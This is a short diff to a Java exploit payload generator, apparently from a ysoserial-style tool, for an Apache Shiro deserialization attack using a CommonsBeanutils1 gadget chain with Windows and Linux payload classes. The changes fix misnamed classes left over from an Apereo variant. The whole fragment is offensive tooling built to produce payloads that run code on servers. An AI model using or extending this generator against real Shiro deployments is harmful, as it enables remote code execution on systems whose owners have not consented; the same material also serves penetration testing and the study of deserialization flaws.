@@ -37,7 +37,7 @@ public class shiro_CommonsBeanutils1 implements ObjectPayload<String> {
         if (platform.startsWith("win")) {
             classpayload = Shiro_win.class;
         } else {
-            classpayload = Apereo_linux.class;
+            classpayload = Shiro_linux.class;
         }
         final Object templates = Gadgets2.createTemplatesImpl(classpayload);
         // mock method name until armed
@@ -61,7 +61,7 @@ public class shiro_CommonsBeanutils1 implements ObjectPayload<String> {
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(apereo_CommonsCollections2.class, args);
+        PayloadRunner.run(shiro_CommonsBeanutils1.class, args);
     }
 
 }
